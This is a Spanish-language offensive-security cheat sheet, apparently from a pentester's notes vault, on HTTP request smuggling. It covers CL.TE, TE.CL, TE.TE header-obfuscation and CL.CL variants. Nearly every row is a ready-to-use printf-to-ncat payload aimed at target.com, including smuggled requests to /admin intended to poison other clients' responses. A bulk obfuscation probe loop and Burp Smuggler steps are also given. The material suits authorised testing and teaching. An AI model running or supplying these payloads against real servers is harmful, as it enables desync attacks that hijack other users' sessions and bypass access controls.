---
aliases:
  - CL.TE
  - TE.CL
  - TE.TE
  - CL.CL
  - Classic Smuggling
tags:
  - type/technique
  - vuln/http-smuggling
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[HTTP Request Smuggling]]'
---
# HTTP Request Smuggling - Variantes Clásicas

***

## CL.TE (Front Content-Length, Back Transfer-Encoding)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' \| ncat target.com 80` | CL.TE smuggle — front procesa 13 bytes, back termina en `0\r\n\r\n` | Frontend honra CL, backend honra TE. |
| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 60\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n' \| ncat target.com 80` | Smuggle GET /admin → próximo cliente recibe response /admin | Standard CL.TE exploit. |
| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 100\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\nContent-Length: 10\r\n\r\nx=evilbody' \| ncat target.com 80` | Smuggle POST con body | POST en smuggled. |
| Burp → Right-click → "HTTP Request Smuggler" → "Detect" → choose CL.TE | Auto-detect + auto-calculate CL | Tool-driven. |
| Burp Repeater → "Send group → in single connection" con dos requests (poison + victim) | Self-poison test seguro | Validation. |
| `curl -v --http1.1 -H "Content-Length: 13" -H "Transfer-Encoding: chunked" --data-binary $'0\r\n\r\nSMUGGLED' https://target/` | Curl-based test (less control) | Quick test. |
^hrs-cl-te

### Ejemplo CL.TE completo

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked
Connection: keep-alive

0

SMUGGLED
```

Frontend ve POST con body de 13 bytes. Backend lee `0\r\n\r\n` (terminador chunked) → considera body terminado → trata `SMUGGLED` como inicio de próxima request.

___

## TE.CL (Front Transfer-Encoding, Back Content-Length)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n' \| ncat target.com 80` | TE.CL smuggle — front procesa chunked, back procesa CL=4 | Frontend honra TE, backend honra CL. |
| Burp → Right-click → "HTTP Request Smuggler" → "Detect" → choose TE.CL | Auto-calc chunk size + CL | Tool-driven (manual prone-to-error). |
| `python3 -c "req=b'GPOST / HTTP/1.1\r\nHost: x\r\n\r\n'; print(hex(len(req))[2:])"` | Calcula chunk-size hex para smuggled request | Manual chunk-size calc. |
| Burp Repeater group "Send in single connection" + custom TE.CL request | Manual fine-tune | Sin auto. |
| Validation: re-fetch / con misma sesión → ver si próxima respuesta refleja smuggled | Self-poison validation | Confirm vector. |
^hrs-te-cl

### Ejemplo TE.CL completo

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Frontend ve chunked completo. Backend lee CL=4 → considera body = `5c\r\n` (4 chars) → resto queda como nueva request `GPOST /...`.

___

## TE.TE (Header Obfuscation)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: xchunked\r\n\r\n0\r\n\r\nSMUGGLED' \| ncat target.com 80` | TE obfuscation — front rejecta `xchunked`, back acepta (o viceversa) | Header parsers diferenciales. |
| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding : chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nSMUGGLED' \| ncat target.com 80` | Espacio antes `:` (OWS) | RFC permits OWS, parsers difieren. |
| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding:\tchunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nSMUGGLED' \| ncat target.com 80` | Tab en vez de espacio | Whitespace differential. |
| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\nContent-Length: 4\r\n\r\n0\r\n\r\nSMUGGLED' \| ncat target.com 80` | Doble TE header con identity | Diff parser primer/último. |
| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: gzip, chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nSMUGGLED' \| ncat target.com 80` | Multi-value TE | Some servers strip first part. |
| Burp → Smuggler → "Smuggle probe" → mostrar variantes obfuscation que funcionan | Auto-discovery TE.TE variants | Comprehensive. |
| `for ob in 'xchunked' ' chunked' '\tchunked' 'chunked, identity' 'gzip, chunked'; do printf "POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: $ob\r\nContent-Length: 4\r\n\r\n0\r\n\r\nX" \| ncat target 80; done` | Bulk obfuscation probe | Discovery loop. |
^hrs-te-te

___

## CL.CL (Header Doubling)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 12\r\nContent-Length: 17\r\n\r\nbody12bytesXXSMUG' \| ncat target.com 80` | Doble CL — front lee 12, back lee 17 (o viceversa) | RFC dice rejectar pero parsers laxos. |
| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 5\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nXX' \| ncat target.com 80` | Triple confusion CL+CL+TE | Combined edge. |
| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 12\r\ncontent-length: 17\r\n\r\nbody...' \| ncat target.com 80` | Case differential CL header | Case-sensitive parsers. |
| Burp → Smuggler → "CL.CL detect" mode | Auto-detect doble CL acceptance | Test. |
^hrs-cl-cl

***
